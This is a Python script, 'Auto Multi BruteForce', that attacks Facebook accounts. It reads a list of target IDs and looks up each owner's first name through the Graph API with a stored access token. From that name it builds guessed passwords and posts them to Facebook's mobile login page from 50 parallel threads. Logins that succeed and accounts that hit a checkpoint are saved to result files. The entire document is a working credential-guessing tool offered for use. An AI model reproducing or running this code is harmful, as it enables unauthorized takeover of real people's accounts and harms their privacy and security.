import requests,os,sys,time,json
from multiprocessing.pool import  ThreadPool

class AutoB:
	def __init__(self):
		self.fnd=[]
		self.cek=[]
		self.hit=1
		self.req=requests.Session()
		self.ken=open('toket/token.txt','r').read()
		self.u='https://graph.facebook.com/{}'
		self.main()

	def attk(self,id):
		try:
			self.autop(id)
			for xi in self.lid:
				data={'email':id,'pass':xi}
				head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
				re=self.req.post('https://mbasic.facebook.com/login',data=data,headers=head)
				if 'save-device' in str(re.content) or 'm_sess' in str(re.content):
					pen=open('result/found.txt','a')
					pen.write(f'{id}|{xi}\n')
					self.fnd.append('ntaps')
					break
				elif 'checkpoint' in str(re.content):
					pen=open('result/cek.txt','a')
					pen.write(f'{id}|{xi}\n')
					self.cek.append('yaudah gpp')
					break
			print(f'\r[CRACK] >> {self.hit}/{len(self.file)} F[{len(self.fnd)}] CP[{len(self.cek)}] <<',end='');sys.stdout.flush()
			self.hit+=1
		except: pass

	def main(self):
		print("""
	;;;;;;;;;;;;;;;;;;;;;;;;;
	; Auto Multi BruteForce ;
	;    By: KANG-NEWBIE    ;
	;;;;;;;;;;;;;;;;;;;;;;;;;
	""")
		fil=input('[?] List Id Target: ')
		try:
			self.file=open(fil,'r').read().splitlines()
		except FileNotFoundError:
			exit('[!] File not found')
		tan=input('[?] Try Auto Multi BruteForce+ (longer) [y/n]: ')
		if tan == 'y' or tan == 'Y':
			self.spas=input('[!] enter the special password leave blank for default\n[?] Special password: ')
			self.AP=True
		print()
		p=ThreadPool(50)
		p.map(self.attk,self.file)
		if 'ntaps' in str(self.fnd) or 'yaudah gpp' in str(self.cek):
			print("\nFound ["+str(len(self.fnd))+"] CheckPoint ["+str(len(self.cek))+"]")
		else: print("\n[ :( ] nothing found")
		if len(self.fnd) > 0:
			print("found result saved: result/found.txt")
		if len(self.cek) > 0:
			print("check result saved: result/cek.txt")

	def autop(self,id):
		try:
			nem=self.req.get(self.u.format(id+'/?access_token='+self.ken))
			js=json.loads(nem.text)
			if ' ' in js['first_name']:
				name=js['first_name'].split(' ')[0]
			else:
				name=js['first_name']
			self.lid=[name+'123',name.lower()+'123']
			if self.AP == True:
				self.lid.append(name+'12345')
				self.lid.append(name.lower()+'12345')
				self.lid.append(self.spas)
		except: pass
try:
	AutoB()
except Exception as FCK:
	print(f'Err: {FCK}')